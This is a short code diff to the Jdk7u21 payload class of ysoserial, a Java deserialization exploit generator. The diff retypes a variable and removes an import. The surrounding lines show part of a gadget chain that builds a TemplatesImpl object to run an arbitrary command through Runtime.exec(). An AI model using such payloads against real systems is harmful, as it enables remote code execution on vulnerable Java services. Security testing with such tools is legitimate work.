@@ -11,7 +11,6 @@ import ysoserial.payloads.util.Gadgets;
 import ysoserial.payloads.util.PayloadRunner;
 import ysoserial.payloads.util.Reflections;
 
-import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
 
 /*
 
@@ -51,12 +50,12 @@ LinkedHashSet.readObject()
                                 Runtime.exec()
  */
 
-@SuppressWarnings({ "rawtypes", "unchecked", "restriction" })
+@SuppressWarnings({ "rawtypes", "unchecked" })
 @Dependencies()
 public class Jdk7u21 implements ObjectPayload<Object> {
 
 	public Object getObject(final String command) throws Exception {
-		final TemplatesImpl templates = Gadgets.createTemplatesImpl(command);
+		final Object templates = Gadgets.createTemplatesImpl(command);
 
 		String zeroHashCodeStr = "f5a5a608";
 
